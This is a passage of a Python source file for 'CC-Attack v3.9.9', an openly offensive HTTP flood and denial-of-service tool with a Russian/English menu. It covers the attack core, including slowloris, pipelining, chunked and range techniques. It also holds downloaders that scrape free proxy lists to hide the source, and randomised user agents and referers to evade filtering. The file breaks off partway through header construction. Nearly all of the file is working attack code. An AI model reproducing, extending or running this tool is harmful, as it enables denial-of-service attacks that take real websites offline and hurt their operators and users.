#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
CC-Attack v3.9.9 — refactored + i18n (RU/EN) + fast proxy checker
                    + RPS boost + multi-method/technique + interactive menu
                    + updated 2026 proxy sources
Author: DIDO
Requires: pip install requests pysocks
"""
import argparse
import concurrent.futures as cf
import datetime
import json
import logging
import os
import platform
import random
import re
import signal
import socket
import ssl
import sys
import threading
import time
from pathlib import Path

import requests
import socks

# ─────────────────────────────────────────────────────────────────────────────
#  ANSI / цветовая палитра
# ─────────────────────────────────────────────────────────────────────────────
class C:
    RESET = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    RED   = "\033[91m"
    ORG   = "\033[38;5;208m"
    YEL   = "\033[93m"
    GRN   = "\033[92m"
    CYN   = "\033[96m"
    BLU   = "\033[94m"
    PRP   = "\033[95m"
    WHT   = "\033[97m"

VERSION = "3.9.9"
BUILD   = "2026/09/25"

# ── Параметры RPS-буста ─────────────────────────────────────────────────────
PIPELINE_DEPTH        = 8
KEEPALIVE_PER_SOCKET  = 500
SOCKET_SNDBUF         = 262144
SOCKET_RCVBUF         = 262144
CONNECT_TIMEOUT       = 2.5
SEND_TIMEOUT          = 2.0
ERROR_BACKOFF         = 0.002
SLOW_DELAY_DEFAULT    = 0.5

# ── Множества методов и техник ──────────────────────────────────────────────
HTTP_METHODS = [
    "GET", "POST", "HEAD", "PUT", "DELETE",
    "PATCH", "OPTIONS", "TRACE", "CONNECT",
]
TECHNIQUES = [
    "flood", "slow", "pipeline", "mixed", "random",
    "slowloris", "gzip", "chunked", "range", "http2",
]

# ── Регулярка для валидного прокси ──────────────────────────────────────────
_PROXY_RE = re.compile(
    r"(?:\[(?P<ip6>[0-9a-fA-F:]+)\]|(?P<ip4>\d{1,3}(?:\.\d{1,3}){3}))"
    r":(?P<port>\d{1,5})"
)

# ── Профили ─────────────────────────────────────────────────────────────────
PROFILES_FILE = Path("profiles.json")

# ─────────────────────────────────────────────────────────────────────────────
#  ЛОКАЛИЗАЦИЯ (RU / EN)
# ─────────────────────────────────────────────────────────────────────────────
LANG = "en"

TEXTS = {
    "ru": {
        "banner_attack":   "C C - A T T A C K",
        "banner_present":  "P R E S E N T E D   B Y",
        "banner_python":   "Python",
        "banner_cpu":      "CPU",
        "err_url_prefix":  "URL должен начинаться с http:// или https://",
        "err_no_url":      "Не задан -url. Завершение.",
        "err_no_proxy":    "Нет прокси. Используйте -down.",
        "err_no_alive":    "Не найдено рабочих прокси.",
        "err_data_read":   "Не читается -data: {e}",
        "err_method":      "Неверный метод: {m}. Доступные: {avail}",
        "err_technique":   "Неверная техника: {t}. Доступные: {avail}",
        "err_int":         "Ожидалось целое число",
        "err_range":       "Значение должно быть в диапазоне {lo}..{hi}",
        "info_target":     "Цель: {url}",
        "info_mode":       "Режим: {mode}  •  метод: {method}  •  техника: {tech}",
        "info_perf":       "Потоков: {threads}  •  прокси: {v}  •  pipeline: {p}",
        "info_download":   "Загрузка прокси: {n} источников ({kind})…",
        "ok_saved_proxy":  "Сохранено {n} уникальных прокси → {path}",
        "info_normalized": "Нормализовано: {n} прокси (отброшено: {bad})",
        "ok_proxy_count":  "Прокси в наличии: {n}",
        "info_checking":   "Проверка {n} прокси (timeout={ms}s, workers={w})…",
        "check_progress":  "  > проверено {done}/{total} ({pct:5.1f}%)  живых: {alive:<5}  скорость: {rps:5.0f}/с  ETA: {eta:>4}s   ",
        "check_autosave":  "Автосохранение: {n} живых → {path}",
        "ok_alive":        "Рабочих прокси: {n} из {total} ({pct:.1f}%)",
        "ok_top":          "Топ-{n} самых быстрых:",
        "ok_top_line":     "  {rank:>2}. {proxy:<24} {ms:>4} мс",
        "info_start":      "Запуск потоков…",
        "warn_shutdown":   "Завершение по Ctrl+C…",
        "warn_force":      "Повторный сигнал — жёсткий выход.",
        "warn_interrupt":  "Прервано пользователем.",
        "ok_done":         "Готово. Отправлено: {sent}, ошибок: {err}, трафик: {mb:.2f} МБ, средний RPS: {rps:.0f}",
        "progress":        "  {grn}▶{rst} {el:>3}/{tot}s  | {cyn}отправлено:{rst} {sent:<9} | {red}ошибок:{rst} {err:<7} | {yel}МБ:{rst} {mb:>6.2f} | {prp}RPS:{rst} {rps:>7.0f}",
        "help_title":      "справка",
        "help_url":        "цель (обязательно)",
        "help_mode":       "режим (cc/post/head)",
        "help_method":     "HTTP-метод: GET/POST/HEAD/PUT/DELETE/PATCH/OPTIONS/TRACE/CONNECT/RANDOM",
        "help_technique":  "техника: flood/slow/pipeline/mixed/random/slowloris/gzip/chunked/range/http2",
        "help_proxy":      "тип прокси (по умолчанию 5)",
        "help_threads":    "потоков (по умолчанию 800)",
        "help_period":     "длительность атаки (60)",
        "help_brute":      "TCP_NODELAY brute (0)",
        "help_file":       "файл прокси (proxy.txt)",
        "help_data":       "тело запроса (для POST/PUT/PATCH/DELETE)",
        "help_with_data":  "подставлять -data во все методы с телом",
        "help_slow_delay": "задержка в slow-режиме (0.5)",
        "help_cookies":    "Cookie-строка",
        "help_down":       "скачать прокси",
        "help_check":      "проверить прокси (быстрая проверка)",
        "help_check_to":   "таймаут проверки прокси в секундах (3)",
        "help_check_w":    "воркеров проверки прокси (500)",
        "help_pipeline":   "глубина pipeline 1..64 (8)",
        "help_keepalive":  "запросов на сокет 1..10000 (500)",
        "help_log":        "дублировать вывод в файл",
        "help_lang":       "язык интерфейса: ru | en",
        "help_help":       "эта справка",
        "help_menu":       "интерактивное меню",
        "help_profile":    "загрузить профиль из profiles.json",
        "help_save_profile": "сохранить текущие аргументы как профиль",
        "lang_select":     "Выберите язык / Select language:",
        "lang_prompt":     "Ваш выбор (ru/en) [ru]: ",
        "lang_invalid":    "Неверный выбор. Введите ru или en.",
        "menu_title":      "ГЛАВНОЕ МЕНЮ",
        "menu_hint":       "Введите номер пункта и нажмите Enter",
        "menu_1":          "URL цели",
        "menu_2":          "Режим (cc / post / head)",
        "menu_3":          "HTTP-метод",
        "menu_4":          "Техника атаки",
        "menu_5":          "Тип прокси (4 / 5 / http)",
        "menu_6":          "Количество потоков",
        "menu_7":          "Длительность атаки (сек)",
        "menu_8":          "Pipeline (1..64)",
        "menu_9":          "Keep-Alive (1..10000)",
        "menu_10":         "Файл прокси",
        "menu_11":         "Cookies",
        "menu_12":         "POST-данные (файл)",
        "menu_13":         "Brute (TCP_NODELAY)",
        "menu_14":         "Скачать прокси (-down)",
        "menu_15":         "Проверить прокси (-check)",
        "menu_16":         "Таймаут проверки (сек)",
        "menu_17":         "Воркеров проверки",
        "menu_18":         "Язык интерфейса",
        "menu_19":         "Показать текущие настройки",
        "menu_20":         "Сохранить профиль",
        "menu_21":         "Загрузить профиль",
        "menu_22":         "Список профилей",
        "menu_23":         "▶ ЗАПУСТИТЬ АТАКУ",
        "menu_0":          "Выход",
        "menu_choice":     "Выбор",
        "menu_back":       "Enter — назад в меню…",
        "menu_enter_url":  "Введите URL цели (или 0 для отмены): ",
        "menu_enter_mode": "Введите режим [cc/post/head] (0 — отмена): ",
        "menu_enter_meth": "Введите метод (" + "/".join(HTTP_METHODS) + "/RANDOM) (0 — отмена): ",
        "menu_enter_tech": "Введите технику (" + "/".join(TECHNIQUES) + ") (0 — отмена): ",
        "menu_enter_prox": "Введите тип прокси [4/5/http] (0 — отмена): ",
        "menu_enter_thr":  "Введите количество потоков (1..5000) (0 — отмена): ",
        "menu_enter_sec":  "Введите длительность в секундах (1..86400) (0 — отмена): ",
        "menu_enter_pipe": "Введите pipeline (1..64) (0 — отмена): ",
        "menu_enter_ka":   "Введите keep-alive (1..10000) (0 — отмена): ",
        "menu_enter_file": "Введите имя файла прокси (0 — отмена): ",
        "menu_enter_cook": "Введите cookies (0 — отмена, - — очистить): ",
        "menu_enter_data": "Введите путь к файлу POST-данных (0 — отмена, - — очистить): ",
        "menu_enter_toggle": "Введите 1 — вкл, 0 — выкл, Enter — оставить как есть: ",
        "menu_enter_to":   "Введите таймаут проверки в секундах (1..60): ",
        "menu_enter_w":    "Введите число воркеров проверки (1..2000): ",
        "menu_enter_lang": "Введите язык [ru/en]: ",
        "menu_enter_save": "Имя профиля: ",
        "menu_enter_load": "Имя профиля для загрузки (или Enter — отмена): ",
        "menu_current":    "ТЕКУЩИЕ НАСТРОЙКИ",
        "menu_saved":      "Профиль «{n}» сохранён.",
        "menu_loaded":     "Профиль «{n}» загружен.",
        "menu_noprofile":  "Профиль «{n}» не найден.",
        "menu_prof_list":  "СПИСОК ПРОФИЛЕЙ",
        "menu_prof_none":  "(пусто)",
        "menu_summary":    "СВОДКА ПЕРЕД ЗАПУСКОМ",
        "menu_confirm":    "Начать атаку? [Y/n]: ",
        "menu_aborted":    "Отменено.",
        "menu_goodbye":    "До встречи!",
        "menu_unknown":    "Неизвестный пункт.",
        "menu_press":      "Нажмите Enter для продолжения…",
    },
    "en": {
        "banner_attack":   "C C - A T T A C K",
        "banner_present":  "P R E S E N T E D   B Y",
        "banner_python":   "Python",
        "banner_cpu":      "CPU",
        "err_url_prefix":  "URL must start with http:// or https://",
        "err_no_url":      "No -url specified. Exiting.",
        "err_no_proxy":    "No proxies. Use -down.",
        "err_no_alive":    "No working proxies found.",
        "err_data_read":   "Cannot read -data: {e}",
        "err_method":      "Invalid method: {m}. Available: {avail}",
        "err_technique":   "Invalid technique: {t}. Available: {avail}",
        "err_int":         "Integer expected",
        "err_range":       "Value must be in range {lo}..{hi}",
        "info_target":     "Target: {url}",
        "info_mode":       "Mode: {mode}  •  method: {method}  •  technique: {tech}",
        "info_perf":       "Threads: {threads}  •  proxy: {v}  •  pipeline: {p}",
        "info_download":   "Downloading proxies: {n} sources ({kind})…",
        "ok_saved_proxy":  "Saved {n} unique proxies → {path}",
        "info_normalized": "Normalized: {n} proxies (discarded: {bad})",
        "ok_proxy_count":  "Proxies available: {n}",
        "info_checking":   "Checking {n} proxies (timeout={ms}s, workers={w})…",
        "check_progress":  "  > checked {done}/{total} ({pct:5.1f}%)  alive: {alive:<5}  speed: {rps:5.0f}/s  ETA: {eta:>4}s   ",
        "check_autosave":  "Autosave: {n} alive → {path}",
        "ok_alive":        "Working proxies: {n} of {total} ({pct:.1f}%)",
        "ok_top":          "Top-{n} fastest:",
        "ok_top_line":     "  {rank:>2}. {proxy:<24} {ms:>4} ms",
        "info_start":      "Starting threads…",
        "warn_shutdown":   "Shutdown by Ctrl+C…",
        "warn_force":      "Second signal — hard exit.",
        "warn_interrupt":  "Interrupted by user.",
        "ok_done":         "Done. Sent: {sent}, errors: {err}, traffic: {mb:.2f} MB, avg RPS: {rps:.0f}",
        "progress":        "  {grn}▶{rst} {el:>3}/{tot}s  | {cyn}sent:{rst} {sent:<9} | {red}errs:{rst} {err:<7} | {yel}MB:{rst} {mb:>6.2f} | {prp}RPS:{rst} {rps:>7.0f}",
        "help_title":      "help",
        "help_url":        "target URL (required)",
        "help_mode":       "mode (cc/post/head)",
        "help_method":     "HTTP method: GET/POST/HEAD/PUT/DELETE/PATCH/OPTIONS/TRACE/CONNECT/RANDOM",
        "help_technique":  "technique: flood/slow/pipeline/mixed/random/slowloris/gzip/chunked/range/http2",
        "help_proxy":      "proxy type (default 5)",
        "help_threads":    "threads (default 800)",
        "help_period":     "attack duration in seconds (60)",
        "help_brute":      "TCP_NODELAY brute (0)",
        "help_file":       "proxy file (proxy.txt)",
        "help_data":       "request body (for POST/PUT/PATCH/DELETE)",
        "help_with_data":  "apply -data to all body-capable methods",
        "help_slow_delay": "delay in slow mode (0.5)",
        "help_cookies":    "Cookie string",
        "help_down":       "download proxies",
        "help_check":      "check proxies (fast mode)",
        "help_check_to":   "checker timeout in seconds (3)",
        "help_check_w":    "checker workers (500)",
        "help_pipeline":   "pipeline depth 1..64 (8)",
        "help_keepalive":  "requests per socket 1..10000 (500)",
        "help_log":        "duplicate output to file",
        "help_lang":       "interface language: ru | en",
        "help_help":       "this help",
        "help_menu":       "interactive menu",
        "help_profile":    "load profile from profiles.json",
        "help_save_profile": "save current args as profile",
        "lang_select":     "Выберите язык / Select language:",
        "lang_prompt":     "Your choice (ru/en) [en]: ",
        "lang_invalid":    "Invalid choice. Enter ru or en.",
        "menu_title":      "MAIN MENU",
        "menu_hint":       "Type item number and press Enter",
        "menu_1":          "Target URL",
        "menu_2":          "Mode (cc / post / head)",
        "menu_3":          "HTTP method",
        "menu_4":          "Attack technique",
        "menu_5":          "Proxy type (4 / 5 / http)",
        "menu_6":          "Threads",
        "menu_7":          "Attack duration (sec)",
        "menu_8":          "Pipeline (1..64)",
        "menu_9":          "Keep-Alive (1..10000)",
        "menu_10":         "Proxy file",
        "menu_11":         "Cookies",
        "menu_12":         "POST body (file)",
        "menu_13":         "Brute (TCP_NODELAY)",
        "menu_14":         "Download proxies (-down)",
        "menu_15":         "Check proxies (-check)",
        "menu_16":         "Checker timeout (sec)",
        "menu_17":         "Checker workers",
        "menu_18":         "Interface language",
        "menu_19":         "Show current settings",
        "menu_20":         "Save profile",
        "menu_21":         "Load profile",
        "menu_22":         "List profiles",
        "menu_23":         "▶ START ATTACK",
        "menu_0":          "Exit",
        "menu_choice":     "Choice",
        "menu_back":       "Enter — back to menu…",
        "menu_enter_url":  "Enter target URL (0 — cancel): ",
        "menu_enter_mode": "Enter mode [cc/post/head] (0 — cancel): ",
        "menu_enter_meth": "Enter method (" + "/".join(HTTP_METHODS) + "/RANDOM) (0 — cancel): ",
        "menu_enter_tech": "Enter technique (" + "/".join(TECHNIQUES) + ") (0 — cancel): ",
        "menu_enter_prox": "Enter proxy type [4/5/http] (0 — cancel): ",
        "menu_enter_thr":  "Enter threads (1..5000) (0 — cancel): ",
        "menu_enter_sec":  "Enter duration in seconds (1..86400) (0 — cancel): ",
        "menu_enter_pipe": "Enter pipeline (1..64) (0 — cancel): ",
        "menu_enter_ka":   "Enter keep-alive (1..10000) (0 — cancel): ",
        "menu_enter_file": "Enter proxy file name (0 — cancel): ",
        "menu_enter_cook": "Enter cookies (0 — cancel, - — clear): ",
        "menu_enter_data": "Enter path to POST body file (0 — cancel, - — clear): ",
        "menu_enter_toggle": "Enter 1 — on, 0 — off, Enter — keep: ",
        "menu_enter_to":   "Enter checker timeout sec (1..60): ",
        "menu_enter_w":    "Enter checker workers (1..2000): ",
        "menu_enter_lang": "Enter language [ru/en]: ",
        "menu_enter_save": "Profile name: ",
        "menu_enter_load": "Profile to load (or Enter — cancel): ",
        "menu_current":    "CURRENT SETTINGS",
        "menu_saved":      "Profile '{n}' saved.",
        "menu_loaded":     "Profile '{n}' loaded.",
        "menu_noprofile":  "Profile '{n}' not found.",
        "menu_prof_list":  "PROFILES",
        "menu_prof_none":  "(empty)",
        "menu_summary":    "SUMMARY BEFORE START",
        "menu_confirm":    "Start attack? [Y/n]: ",
        "menu_aborted":    "Cancelled.",
        "menu_goodbye":    "Goodbye!",
        "menu_unknown":    "Unknown item.",
        "menu_press":      "Press Enter to continue…",
    },
}


def t(_k: str, **kw) -> str:
    s = TEXTS.get(LANG, TEXTS["en"]).get(_k, _k)
    return s.format(**kw) if kw else s


def detect_lang_from_env() -> str | None:
    for var in ("LANGUAGE", "LC_ALL", "LC_MESSAGES", "LANG"):
        val = os.environ.get(var, "")
        if not val:
            continue
        low = val.lower()
        if low.startswith("ru") or "ru_" in low or low == "ru":
            return "ru"
        if low.startswith("en") or "en_" in low or low == "en":
            return "en"
    return None


def select_language(forced: str | None = None) -> str:
    global LANG
    if forced in ("ru", "en"):
        LANG = forced
        return LANG
    env = detect_lang_from_env()
    if env:
        LANG = env
        return LANG
    if not sys.stdin.isatty():
        LANG = "en"
        return LANG

    print(f"\n{C.BOLD}{C.YEL}╭──────────────────────────────────────╮{C.RESET}")
    print(f"{C.BOLD}{C.YEL}│{C.RESET}  {C.WHT}Выберите язык / Select language{C.RESET}   {C.YEL}│{C.RESET}")
    print(f"{C.BOLD}{C.YEL}│{C.RESET}                                     {C.YEL}│{C.RESET}")
    print(f"{C.BOLD}{C.YEL}│{C.RESET}    {C.GRN}[1]{C.RESET} Русский                       {C.YEL}│{C.RESET}")
    print(f"{C.BOLD}{C.YEL}│{C.RESET}    {C.CYN}[2]{C.RESET} English                       {C.YEL}│{C.RESET}")
    print(f"{C.BOLD}{C.YEL}╰──────────────────────────────────────╯{C.RESET}")

    while True:
        try:
            choice = input(f"{C.CYN}>{C.RESET} {TEXTS['ru']['lang_prompt']}").strip().lower()
        except (EOFError, KeyboardInterrupt):
            LANG = "en"
            return LANG
        if choice in ("", "1", "ru", "r", "рус", "русский"):
            LANG = "ru"
            return LANG
        if choice in ("2", "en", "e", "eng", "english"):
            LANG = "en"
            return LANG
        print(f"{C.RED}{TEXTS['en']['lang_invalid']}{C.RESET}")

# ─────────────────────────────────────────────────────────────────────────────
#  Красивый баннер
# ─────────────────────────────────────────────────────────────────────────────
DIDO_ART = r"""
   ██████╗ ██╗██████╗  ██████╗
   ██╔══██╗██║██╔══██╗██╔═══██╗
   ██║  ██║██║██║  ██║██║   ██║
   ██║  ██║██║██║  ██║██║   ██║
   ██████╔╝██║██████╔╝╚██████╔╝
   ╚═════╝ ╚═╝╚═════╝  ╚═════╝
"""

CC_ART = r"""
    ██████╗ ██████╗
   ██╔════╝██╔════╝
   ██║     ██║
   ██║     ██║
   ╚██████╗╚██████╗
    ╚═════╝ ╚═════╝
"""

def print_banner() -> None:
    line_top = f"{C.RED}╔{'═' * 62}╗{C.RESET}"
    line_bot = f"{C.RED}╚{'═' * 62}╝{C.RESET}"
    line_mid = f"{C.RED}╠{'═' * 62}╣{C.RESET}"

    def row(text: str, color: str = C.WHT, pad: int = 62) -> str:
        vis = len(text)
        left  = (pad - vis) // 2
        right = pad - vis - left
        return (f"{C.RED}║{C.RESET}"
                f"{' ' * left}{color}{text}{C.RESET}{' ' * right}"
                f"{C.RED}║{C.RESET}")

    print()
    print(line_top)
    print(row(t("banner_attack"), C.YEL))
    print(row(f"v{VERSION}  •  {BUILD}", C.CYN))
    print(line_mid)

    for art_line in DIDO_ART.strip("\n").split("\n"):
        print(f"{C.RED}║{C.RESET}{art_line.center(62)}{C.RED}║{C.RESET}")

    print(line_mid)
    print(row(t("banner_present"), C.DIM))
    for art_line in CC_ART.strip("\n").split("\n"):
        print(f"{C.RED}║{C.RESET}{art_line.center(62)}{C.RED}║{C.RESET}")

    print(line_mid)
    print(row(f"{t('banner_python')} {platform.python_version()}  |  "
              f"{platform.system()} {platform.release()}", C.GRN))
    print(row(f"{t('banner_cpu')}: {platform.machine()}  |  PID: {os.getpid()}",
              C.GRN))
    print(line_bot)
    print()

# ─────────────────────────────────────────────────────────────────────────────
#  🆕 ИСТОЧНИКИ ПРОКСИ (ОБНОВЛЕНО 2026)
# ─────────────────────────────────────────────────────────────────────────────
BUILTIN_PROXY_SOURCES = {
    # ── SOCKS4 ──────────────────────────────────────────────────────────────
    "socks4": [
        # Proxifly — обновление каждые 5 минут
        "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt",
        # ProxyScrape — обновление каждые 5 минут
        "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks4/data.txt",
        # TheSpeedX — ежедневно
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        # proxmint — каждые 30 минут
        "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/socks4.txt",
        # iplocate — каждые 30 минут
        "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/socks4.txt",
        # Free Proxy DB — ежедневно
        "https://raw.githubusercontent.com/LoneKingCode/free-proxy-db/main/proxies/socks4.txt",
        # dinoz0rg — проверенные
        "https://raw.githubusercontent.com/dinoz0rg/proxy-list/main/scraped_proxies/socks4.txt",
        # theriturajps — ежечасно
        "https://raw.githubusercontent.com/theriturajps/proxy-list/main/socks4.txt",
    ],
    # ── SOCKS5 ──────────────────────────────────────────────────────────────
    "socks5": [
        # Proxifly — обновление каждые 5 минут
        "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
        # ProxyScrape — обновление каждые 5 минут
        "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks5/data.txt",
        # TheSpeedX — ежедневно
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        # proxmint — каждые 30 минут
        "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/socks5.txt",
        # iplocate — каждые 30 минут
        "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/socks5.txt",
        # Free Proxy DB — ежедневно
        "https://raw.githubusercontent.com/LoneKingCode/free-proxy-db/main/proxies/socks5.txt",
        # dinoz0rg — проверенные
        "https://raw.githubusercontent.com/dinoz0rg/proxy-list/main/scraped_proxies/socks5.txt",
        # theriturajps — ежечасно
        "https://raw.githubusercontent.com/theriturajps/proxy-list/main/socks5.txt",
    ],
    # ── HTTP / HTTPS ────────────────────────────────────────────────────────
    "http": [
        # Proxifly — обновление каждые 5 минут
        "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
        # ProxyScrape — обновление каждые 5 минут
        "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/http/data.txt",
        # TheSpeedX — ежедневно
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        # proxmint — каждые 30 минут
        "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/http.txt",
        # iplocate — каждые 30 минут
        "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/http.txt",
        # Free Proxy DB — ежедневно
        "https://raw.githubusercontent.com/LoneKingCode/free-proxy-db/main/proxies/http.txt",
        # dinoz0rg — проверенные
        "https://raw.githubusercontent.com/dinoz0rg/proxy-list/main/scraped_proxies/http.txt",
        # theriturajps — ежечасно
        "https://raw.githubusercontent.com/theriturajps/proxy-list/main/proxies.txt",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
#  Логгер
# ─────────────────────────────────────────────────────────────────────────────
class Log:
    _lock = threading.Lock()

    @staticmethod
    def _emit(prefix: str, color: str, msg: str) -> None:
        with Log._lock:
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            sys.stdout.write(
                f"{C.DIM}[{ts}]{C.RESET} {color}{prefix}{C.RESET} {msg}\n"
            )
            sys.stdout.flush()

    @staticmethod
    def info(m): Log._emit("[*]", C.CYN, m)
    @staticmethod
    def ok(m):   Log._emit("[+]", C.GRN, m)
    @staticmethod
    def warn(m): Log._emit("[!]", C.YEL, m)
    @staticmethod
    def err(m):  Log._emit("[-]", C.RED, m)

# ─────────────────────────────────────────────────────────────────────────────
#  UA / Accept / Referer
# ─────────────────────────────────────────────────────────────────────────────
_CHROME_VERSIONS = [f"{v}.0.0.0" for v in range(120, 137)]
_FIREFOX_VERSIONS = [f"{v}.0" for v in range(120, 135)]
_OS_WINDOWS = [
    "Windows NT 10.0; Win64; x64",
    "Windows NT 10.0; WOW64",
    "Windows NT 10.0",
    "Windows NT 6.3; Win64; x64",
    "Windows NT 6.1; Win64; x64",
]
_OS_MAC = [
    "Macintosh; Intel Mac OS X 10_15_7",
    "Macintosh; Intel Mac OS X 11_7_10",
    "Macintosh; Intel Mac OS X 12_7_6",
    "Macintosh; Intel Mac OS X 13_6_6",
    "Macintosh; Intel Mac OS X 14_6_1",
]
_OS_LINUX = ["X11; Linux x86_64", "X11; Linux i686", "X11; Ubuntu; Linux x86_64"]

ACCEPT_HEADERS = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: application/json, text/plain, */*\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
    "Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\n",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.google.ru/search?q=",
    "https://yandex.ru/search/?text=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://search.yahoo.com/search?p=",
    "https://www.youtube.com/results?search_query=",
    "https://vk.com/search?c[q]=",
    "https://ok.ru/search?st.query=",
    "https://steamcommunity.com/market/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/?q=",
    "https://check-host.net/",
    "https://github.com/search?q=",
    "https://stackoverflow.com/search?q=",
    "https://www.reddit.com/search/?q=",
]

_UA_CACHE: list[str] = []
_UA_CACHE_LOCK = threading.Lock()

def get_ua() -> str:
    if not _UA_CACHE:
        with _UA_CACHE_LOCK:
            if not _UA_CACHE:
                for _ in range(512):
                    plat = random.choice(("win", "mac", "lin"))
                    if plat == "win":
                        os_str = random.choice(_OS_WINDOWS)
                    elif plat == "mac":
                        os_str = random.choice(_OS_MAC)
                    else:
                        os_str = random.choice(_OS_LINUX)
                    if random.random() < 0.7:
                        wv = random.randint(537, 605)
                        cv = random.choice(_CHROME_VERSIONS)
                        _UA_CACHE.append(
                            f"Mozilla/5.0 ({os_str}) AppleWebKit/{wv}.36 "
                            f"(KHTML, like Gecko) Chrome/{cv} Safari/{wv}.36"
                        )
                    else:
                        fv = random.choice(_FIREFOX_VERSIONS)
                        _UA_CACHE.append(
                            f"Mozilla/5.0 ({os_str}; rv:{fv}) "
                            f"Gecko/20100101 Firefox/{fv}"
                        )
    return random.choice(_UA_CACHE)

# ─────────────────────────────────────────────────────────────────────────────
#  Ядро атаки
# ─────────────────────────────────────────────────────────────────────────────
class CCHandler:
    def __init__(self, target: str, path: str, port: int, protocol: str,
                 proxies: list[str], proxy_type: int, cookies: str,
                 post_data: str, brute: bool, stop_event: threading.Event,
                 method: str = "GET",
                 technique: str = "flood",
                 slow_delay: float = SLOW_DELAY_DEFAULT,
                 with_data: bool = False,
                 header_refresh: int = 32,
                 pipeline_depth: int = PIPELINE_DEPTH,
                 keepalive_per_socket: int = KEEPALIVE_PER_SOCKET,
                 header_pool_size: int = 2000):
        self._rr_lock  = threading.Lock()
        self._hdr_lock = threading.Lock()
        self._slock    = threading.Lock()

        self.target   = target
        self.path     = path
        self.port     = port
        self.protocol = protocol
        self.proxies  = proxies
        self.proxy_type = proxy_type
        self.cookies  = cookies
        self.post_data = post_data
        self.brute    = brute
        self.stop     = stop_event
        self.header_refresh = header_refresh
        self.pipeline_depth = max(1, min(64, pipeline_depth))
        self.keepalive_per_socket = max(1, min(10000, keepalive_per_socket))
        self.header_pool_size = max(200, min(20000, header_pool_size))
        self.method    = method.upper() if method != "RANDOM" else "RANDOM"
        self.technique = technique.lower()
        self.slow_delay = max(0.0, slow_delay)
        self.with_data = with_data

        self._rr = random.randint(0, max(0, len(proxies) - 1))

        self._hdr_pool: list[str] = []
        self._hdr_pool_ready = False

        self.stats = {"sent": 0, "errors": 0, "bytes": 0}

        self._sep = "&" if "?" in self.path else "?"
        self._host_line = f"Host: {self.target}\r\n"

    def _stat(self, sent: int = 0, err: int = 0, nbytes: int = 0) -> None:
        with self._slock:
            self.stats["sent"] += sent
            self.stats["errors"] += err
            self.stats["bytes"] += nbytes

    def _ensure_headers(self) -> None:
        if self._hdr_pool_ready:
            return
        with self._hdr_lock:
            if self._hdr_pool_ready:
                return
            n = self.header_pool_size
            m = self.method if self.method != "RANDOM" else "GET"
            self._hdr_pool = [self._build_header(m) for _ in range(n)]
            self._hdr_pool_ready = True

    def _rand_header(self) -> str:
        return self._hdr_pool[random.randrange(len(self._hdr_pool))]

    def _pick_proxy(self) -> tuple[str, int]:
        n = len(self.proxies)
        for _ in range(min(20, n)):
            with self._rr_lock:
                self._rr = (self._rr + 1) % n
                p = self.proxies[self._rr].strip()
            host, sep, port_s = p.rpartition(":")
            if not sep:
                continue
            try:
                port = int(port_s)
            except ValueError:
                continue
            if not host or " " in host:
                continue
            if not (0 < port < 65536):
                continue
            return host, port
        raise ValueError("no valid proxy in list")

    def _resolve_method(self) -> str:
        if self.method == "RANDOM":
            return random.choice(HTTP_METHODS)
        return self.method

    def _build_header(self, method: str) -> str:
        m = method.upper()
        conn = "Connection: Keep-Alive\r\n"
        if self.cookies:
            conn += f"Cookie: {self.cookies}\r\n"
        ref  = f"Referer: {random.choice(REFERERS)}{self.target}{self.path}\r\n"
        ua   = f"User-Agent: {get_ua()}\r\n"
        acc  = random.choice(ACCEPT_HEADERS)

        if m in ("GET", "HEAD", "OPTIONS", "TRACE", "CONNECT"):
            return ref + ua + acc + conn + "\r\n"

        body = self.post_data or os.urandom(16).hex()
        ctype = "Content-Type: application/x-www-form-urlencoded\r\n"
        extra = ""
        if m == "POST":
            extra = "X-Requested-With: XMLHttpRequest\r\n"
        if self.technique == "gzip":
            extra += "Content-Encoding: gzip\r\n"
            import zlib
            body_bytes = zlib.compress(body.encode("utf-8"))
            body = body_bytes.decode("latin-1")
        elif self.technique == "chunked":
            extra += "Transfer-Encoding: chunked\r\n"
            chunk_size = 8
            chunks = []
            for i in range(0, len(body), chunk_size):
                part = body[i:i + chunk_size]
                chunks.append(f"{len(part):x}\r\n{part}\r\n")
            chunks.append("0\r\n\r\n")
            body = "".join(chunks)
            ctype = ""

        if self.technique == "range":
            extra += "Range: bytes=0-1\r\n"

        if self.technique == "http2":
